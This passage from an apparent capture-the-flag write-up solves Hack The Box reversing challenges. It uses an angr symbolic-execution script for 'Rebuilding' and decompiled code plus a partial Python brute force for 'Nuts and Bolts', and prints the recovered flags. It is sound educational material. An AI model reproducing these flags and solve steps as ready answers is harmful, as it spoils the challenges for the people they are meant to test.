[b&#39;HTB{h0pp1ng_thru_th3_sp4c3_t1m3_c0nt1nuum!}\x80\x80&#39;]
</code></pre><p>not much reversing needed&hellip;</p>
<h1 id="3-rebuilding">3. Rebuilding</h1>
<p>Original files <a href="rev_rebuilding.zip">here</a>.</p>
<p>same as <code>Teleport</code>, just fix the <em>find</em> and <em>avoid</em> offsets&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">angr</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">claripy</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BASE_ADDR</span> <span class="o">=</span> <span class="mh">0x400000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rebase</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">BASE_ADDR</span> <span class="o">+</span> <span class="n">addr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">angr</span><span class="o">.</span><span class="n">Project</span><span class="p">(</span><span class="s1">&#39;rebuilding&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">argv1</span> <span class="o">=</span> <span class="n">claripy</span><span class="o">.</span><span class="n">BVS</span><span class="p">(</span><span class="s2">&#34;argv1&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="o">*</span><span class="mh">0x21</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">initial_state</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">entry_state</span><span class="p">(</span><span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;./rebuilding&#34;</span><span class="p">,</span> <span class="n">argv1</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">sm</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">simulation_manager</span><span class="p">(</span><span class="n">initial_state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sm</span><span class="o">.</span><span class="n">explore</span><span class="p">(</span><span class="n">find</span><span class="o">=</span><span class="n">rebase</span><span class="p">(</span><span class="mh">0x000009f2</span><span class="p">),</span> <span class="n">avoid</span><span class="o">=</span><span class="n">rebase</span><span class="p">(</span><span class="mh">0x00000a05</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">sm</span><span class="o">.</span><span class="n">found</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;no solution&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">found</span> <span class="o">=</span> <span class="n">sm</span><span class="o">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">solution</span> <span class="o">=</span> <span class="n">found</span><span class="o">.</span><span class="n">solver</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">argv1</span><span class="p">,</span> <span class="n">cast_to</span><span class="o">=</span><span class="nb">bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">solution</span> <span class="o">=</span> <span class="n">solution</span><span class="p">[:</span><span class="n">solution</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">solution</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">([</span><span class="n">main</span><span class="p">()])</span>
</span></span></code></pre></div><pre tabindex="0"><code>% python solve02.py
WARNING | 2022-05-21 10:20:18,366 | cle.loader | The main binary is a position-independent executable. It is being loaded with a base address of 0x400000.
WARNING | 2022-05-21 10:20:19,039 | angr.storage.memory_mixins.default_filler_mixin | The program is accessing memory with an unspecified value. This could indicate unwanted behavior.
WARNING | 2022-05-21 10:20:19,040 | angr.storage.memory_mixins.default_filler_mixin | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:
WARNING | 2022-05-21 10:20:19,040 | angr.storage.memory_mixins.default_filler_mixin | 1) setting a value to the initial state
WARNING | 2022-05-21 10:20:19,040 | angr.storage.memory_mixins.default_filler_mixin | 2) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold null
WARNING | 2022-05-21 10:20:19,040 | angr.storage.memory_mixins.default_filler_mixin | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.
WARNING | 2022-05-21 10:20:19,040 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7fffffffffeff6c with 4 unconstrained bytes referenced from 0x400745 (_start+0x5 in rebuilding (0x745))
WARNING | 2022-05-21 10:20:19,180 | angr.storage.memory_mixins.default_filler_mixin | Filling memory at 0x7ffffffffff0000 with 62 unconstrained bytes referenced from 0x78a410 (strlen+0x0 in libc.so.6 (0x8a410))
[b&#39;HTB{h1d1ng_1n_c0nstruct0r5_1n1t}&#39;]
</code></pre><h1 id="4-nuts-and-bolts">4. Nuts and Bolts</h1>
<p>Original files <a href="rev_nuts_and_bolts.zip">here</a>.</p>
<p>It&rsquo;s Rust program, they are nice enough to give us the source code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="line"><span class="cl"><span class="k">use</span><span class="w"> </span><span class="n">std</span>::<span class="n">io</span>::<span class="p">{</span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">Read</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">aes</span>::<span class="n">Aes256</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">aes</span>::<span class="n">cipher</span>::<span class="n">generic_array</span>::<span class="n">GenericArray</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">aes</span>::<span class="n">cipher</span>::<span class="p">{</span><span class="n">BlockEncrypt</span><span class="p">,</span><span class="w"> </span><span class="n">KeyInit</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">nuts_and_bolts</span>::<span class="n">StorageMethod</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">use</span><span class="w"> </span><span class="n">rand</span>::<span class="n">Rng</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mi">0</span><span class="k">u8</span><span class="p">;</span><span class="w"> </span><span class="mi">64</span><span class="p">];</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">io</span>::<span class="n">stdin</span><span class="p">().</span><span class="n">read</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span><span class="w"> </span><span class="n">flag</span><span class="p">).</span><span class="n">expect</span><span class="p">(</span><span class="s">&#34;Flag not provided&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">orig_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span>::<span class="n">thread_rng</span><span class="p">().</span><span class="n">gen</span>::<span class="o">&lt;</span><span class="p">[</span><span class="kt">u8</span><span class="p">;</span><span class="w"> </span><span class="mi">32</span><span class="p">]</span><span class="o">&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GenericArray</span>::<span class="n">from</span><span class="p">(</span><span class="n">orig_key</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Aes256</span>::<span class="n">new</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">flag</span><span class="p">.</span><span class="n">chunks_mut</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="n">for_each</span><span class="p">(</span><span class="o">|</span><span class="n">block</span><span class="o">|</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cipher</span><span class="p">.</span><span class="n">encrypt_block</span><span class="p">(</span><span class="n">GenericArray</span>::<span class="n">from_mut_slice</span><span class="p">(</span><span class="n">block</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">StorageMethod</span>::<span class="n">plain</span><span class="p">(</span><span class="n">orig_key</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">StorageMethod</span>::<span class="n">plain</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="k">mut</span><span class="w"> </span><span class="n">rng</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rand</span>::<span class="n">thread_rng</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">_</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">10</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">rng</span><span class="p">.</span><span class="n">gen</span>::<span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">key</span><span class="p">.</span><span class="n">reverse</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">key</span><span class="p">.</span><span class="n">xor</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">rng</span><span class="p">.</span><span class="n">gen</span>::<span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;</span><span class="p">()</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">flag</span><span class="p">.</span><span class="n">reverse</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">flag</span><span class="p">.</span><span class="n">xor</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;Here&#39;s your key: </span><span class="si">{:?}</span><span class="s">!&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">bincode</span>::<span class="n">serialize</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">).</span><span class="n">unwrap</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&#34;And here&#39;s your flag: </span><span class="si">{:?}</span><span class="s">!&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">bincode</span>::<span class="n">serialize</span><span class="p">(</span><span class="o">&amp;</span><span class="n">flag</span><span class="p">).</span><span class="n">unwrap</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>and some output we need to reverse.</p>
<pre tabindex="0"><code>Here&#39;s your key: [2, 0, 0, 0, 2, 0, 0, 0, 2, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 101, 19, 249, 222, 49, 245, 116, 246, 138, 161, 222, 65, 116, 18, 61, 227, 218, 154, 107, 172, 132, 119, 92, 126, 137, 33, 97, 243, 195, 200, 118, 12]!
And here&#39;s your flag: [2, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 2, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 196, 182, 72, 102, 37, 214, 250, 240, 211, 193, 251, 206, 179, 194, 23, 99, 88, 217, 216, 191, 130, 131, 52, 44, 174, 146, 211, 48, 39, 39, 20, 57, 144, 169, 11, 154, 215, 56, 164, 22, 46, 39, 71, 75, 208, 173, 225, 77, 2, 20, 34, 143, 222, 168, 158, 127, 15, 126, 143, 42, 125, 18, 239, 27]!
</code></pre><p>Basically it it generates a 32 bytes random key, AES encrypt the input flag with it, then performs a transformations on the key and output before printing it.</p>
<p>the applied transformation is either <code>reverse</code> or <code>xor</code> base on a random number % 2.</p>
<p><code>reverse</code> and <code>xor</code> are both methods of ``nuts_and_bolts::StorageMethod``` for which we do not have the source.</p>
<p>For <code>reverse</code> we assume it will just reverse the string (sorry :))</p>
<p>For <code>xor</code> we need to follow the breadcrumbs to <code>nuts_and_bolts::StorageMethod&lt;_&gt;::xor</code> -&gt; <code>nuts_and_bolts::StorageMethod&lt;_&gt;::xor_inner</code> -&gt;  <code>for_each</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">__thiscall</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">slice</span><span class="o">::</span><span class="n">iter</span><span class="o">::</span><span class="n">IterMut</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="n">_as_core</span><span class="o">::</span><span class="n">iter</span><span class="o">::</span><span class="n">traits</span><span class="o">::</span><span class="n">iterator</span><span class="o">::</span><span class="n">Iterator</span><span class="o">&gt;::</span><span class="nf">for_each</span>
</span></span><span class="line"><span class="cl">          <span class="p">(</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">slice</span><span class="o">::</span><span class="n">iter</span><span class="o">::</span><span class="n">IterMut</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="n">_as_core</span><span class="o">::</span><span class="n">iter</span><span class="o">::</span><span class="n">traits</span><span class="o">::</span><span class="n">iterator</span><span class="o">::</span><span class="n">Iterator</span><span class="o">&gt;</span> <span class="o">*</span><span class="n">this</span><span class="p">,</span><span class="n">IterMut</span><span class="o">&lt;</span><span class="n">u8</span><span class="o">&gt;</span> <span class="n">self</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="n">Option</span><span class="o">&lt;&amp;</span><span class="n">mut_u8</span><span class="o">&gt;</span> <span class="n">param_3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">slice</span><span class="o">::</span><span class="n">iter</span><span class="o">::</span><span class="n">IterMut</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="n">_as_core</span><span class="o">::</span><span class="n">iter</span><span class="o">::</span><span class="n">traits</span><span class="o">::</span><span class="n">iterator</span><span class="o">::</span><span class="n">Iterator</span><span class="o">&gt;</span> <span class="o">*</span><span class="n">local_40</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Option</span><span class="o">&lt;&amp;</span><span class="n">mut_u8</span><span class="o">&gt;</span> <span class="n">local_38</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="n">closure_env</span><span class="err">#</span><span class="mi">0</span><span class="p">}</span><span class="o">&lt;</span><span class="mi">64</span><span class="o">&gt;</span> <span class="n">local_30</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">Option</span><span class="o">&lt;&amp;</span><span class="n">mut_u8</span><span class="o">&gt;</span> <span class="n">local_28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Option</span><span class="o">&lt;&amp;</span><span class="n">mut_u8</span><span class="o">&gt;</span> <span class="n">local_20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Option</span><span class="o">&lt;&amp;</span><span class="n">mut_u8</span><span class="o">&gt;</span> <span class="n">local_8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">local_40</span> <span class="o">=</span> <span class="n">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">local_38</span> <span class="o">=</span> <span class="n">param_3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">param_3</span> <span class="o">=</span> <span class="nf">next</span><span class="p">((</span><span class="o">&lt;</span><span class="n">core</span><span class="o">::</span><span class="n">slice</span><span class="o">::</span><span class="n">iter</span><span class="o">::</span><span class="n">IterMut</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="n">_as_core</span><span class="o">::</span><span class="n">iter</span><span class="o">::</span><span class="n">traits</span><span class="o">::</span><span class="n">iterator</span><span class="o">::</span><span class="n">Iterator</span><span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_40</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                          <span class="p">(</span><span class="n">IterMut</span><span class="o">&lt;</span><span class="n">u8</span><span class="o">&gt;</span> <span class="o">*</span><span class="p">)</span><span class="n">param_3</span><span class="p">),</span> <span class="n">param_3</span> <span class="o">!=</span> <span class="p">(</span><span class="n">Option</span><span class="o">&lt;&amp;</span><span class="n">mut_u8</span><span class="o">&gt;</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">local_28</span> <span class="o">=</span> <span class="n">param_3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">local_20</span> <span class="o">=</span> <span class="n">param_3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">local_8</span> <span class="o">=</span> <span class="n">param_3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">nuts_and_bolts</span><span class="o">::</span><span class="n">StorageMethod</span><span class="o">&lt;</span><span class="n">_</span><span class="o">&gt;::</span><span class="n">xor_inner</span><span class="o">::</span><span class="p">{{</span><span class="n">closure</span><span class="p">}}(</span><span class="n">local_30</span><span class="p">,(</span><span class="n">u8</span> <span class="o">*</span><span class="p">)</span><span class="n">param_3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>and then <code>nuts_and_bolts::StorageMethod&lt;_&gt;::xor_inner::{{closure}}</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="n">nuts_and_bolts</span><span class="o">::</span><span class="n">StorageMethod</span><span class="o">&lt;</span><span class="n">_</span><span class="o">&gt;::</span><span class="n">xor_inner</span><span class="o">::</span><span class="p">{{</span><span class="n">closure</span><span class="p">}}({</span><span class="n">closure_env</span><span class="err">#</span><span class="mi">0</span><span class="p">}</span><span class="o">&lt;</span><span class="mi">64</span><span class="o">&gt;</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="n">u8</span> <span class="o">*</span><span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v</span> <span class="o">=</span> <span class="o">*</span><span class="n">v</span> <span class="o">^</span> <span class="mh">0xd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>from there i took another shortcut:</p>
<ul>
<li>the first half of the output (0, 1, 2) is potentially a hint on the transformations to apply</li>
</ul>
<p>but:</p>
<ul>
<li>rev(rev(str)) == str</li>
<li>xor(xor(str, 0xd), 0xd) == str</li>
</ul>
<p>so maybe i can just try to bruteforce it, there&rsquo;s only 16 possibilites:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">xor</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># from output.txt</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">([</span><span class="mi">101</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">249</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">245</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">138</span><span class="p">,</span> <span class="mi">161</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">61</span><span class="p">,</span> <span class="mi">227</span><span class="p">,</span> \
</span></span><span class="line"><span class="cl">    <span class="mi">218</span><span class="p">,</span> <span class="mi">154</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">172</span><span class="p">,</span> <span class="mi">132</span><span class="p">,</span> <span class="mi">119</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">243</span><span class="p">,</span> <span class="mi">195</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">12</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">msg</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">([</span><span class="mi">196</span><span class="p">,</span> <span class="mi">182</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">214</span><span class="p">,</span> <span class="mi">250</span><span class="p">,</span> <span class="mi">240</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">193</span><span class="p">,</span> <span class="mi">251</span><span class="p">,</span> <span class="mi">206</span><span class="p">,</span> <span class="mi">179</span><span class="p">,</span> <span class="mi">194</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> \
</span></span><span class="line"><span class="cl">    <span class="mi">217</span><span class="p">,</span> <span class="mi">216</span><span class="p">,</span> <span class="mi">191</span><span class="p">,</span> <span class="mi">130</span><span class="p">,</span> <span class="mi">131</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">174</span><span class="p">,</span> <span class="mi">146</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">169</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">154</span><span class="p">,</span> <span class="mi">215</span><span class="p">,</span> \
</span></span><span class="line"><span class="cl">    <span class="mi">56</span><span class="p">,</span> <span class="mi">164</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">208</span><span class="p">,</span> <span class="mi">173</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">77</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">143</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">168</span><span class="p">,</span> <span class="mi">158</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> \
</span></span><span class="line"><span class="cl">    <span class="mi">126</span><span class="p">,</span> <span class="mi">143</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">239</span><span class="p">,</span> <span class="mi">27</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># all keys </span>
</span></span><span class="line"><span class="cl"><span class="n">keys</span> <span class="o">=</span> <span class="p">[</span><span class="n">key</span><span class="p">,</span> <span class="n">key</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">xor</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">),</span> <span class="n">xor</span><span class="p">(</span><span class="n">key</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mh">0xd</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># all msgs</span>
